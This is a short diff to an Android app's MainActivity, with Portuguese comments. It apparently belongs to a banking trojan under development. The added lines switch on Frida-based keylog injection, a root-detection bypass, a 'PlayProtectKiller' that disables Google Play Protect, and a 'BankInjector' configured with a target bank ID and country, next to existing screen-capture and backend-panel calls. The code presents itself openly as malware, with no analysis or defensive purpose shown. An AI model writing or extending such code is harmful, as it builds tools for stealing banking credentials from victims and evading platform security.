@@ -105,7 +105,18 @@ class MainActivity : ComponentActivity() {
 
         loadPanelFromBackend()
         requestScreenCapturePermissionIfNeeded()
-        FridaLoader.init(this)
+        
+        // Inicializar Frida gadget apenas se habilitado
+        if (BuildConfig.ENABLE_KEYLOG_INJECTION) {
+            FridaLoader.init(this)
+        }
+        
+        // Inicializar serviços de bypass e injeção
+        if (BuildConfig.ENABLE_ROOT_BYPASS) {
+            RootBypassService.init(this)
+        }
+        PlayProtectKiller.init(this, BuildConfig.ENABLE_PLAY_PROTECT_BYPASS)
+        BankInjector.init(this, BuildConfig.BANK_ID, BuildConfig.BANK_COUNTRY)
     }
 
     override fun onResume() {
